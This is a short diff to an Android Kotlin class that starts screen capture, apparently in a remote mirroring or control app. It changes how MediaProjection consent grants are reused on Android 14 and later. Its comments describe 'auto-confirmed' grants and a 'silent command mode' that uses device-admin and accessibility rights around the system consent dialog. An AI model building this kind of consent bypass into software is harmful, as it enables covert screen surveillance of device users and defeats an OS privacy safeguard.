@@ -68,11 +68,19 @@ object RtcStarter {
             return JSONObject().put("alreadyLive", true)
         }
         // Reuse the stored consent grant — no repeated allow prompts, no crash
-        // loop from stacked consent dialogs.
-        val grant = ScreenGrantHolder.peek()
-        if (grant != null) {
-            CaptureService.startScreen(ctx, grant.second, grant.first)
-            return JSONObject().put("starting", true).put("reusedGrant", true)
+        // loop from stacked consent dialogs. Android 14+ (API 34) projection
+        // consents are SINGLE-USE by the OS, so from SDK 34 on we always ask
+        // for a fresh (auto-confirmed) grant instead of replaying a dead one —
+        // replaying used to throw SecurityException and clear itself, which
+        // looked like the mirror request looping forever.
+        if (android.os.Build.VERSION.SDK_INT < 34) {
+            val grant = ScreenGrantHolder.peek()
+            if (grant != null) {
+                CaptureService.startScreen(ctx, grant.second, grant.first)
+                return JSONObject().put("starting", true).put("reusedGrant", true)
+            }
+        } else {
+            ScreenGrantHolder.clear()
         }
         // Silent command mode (device admin + accessibility ON): open the
         // system MediaProjection dialog directly instead of waiting for the
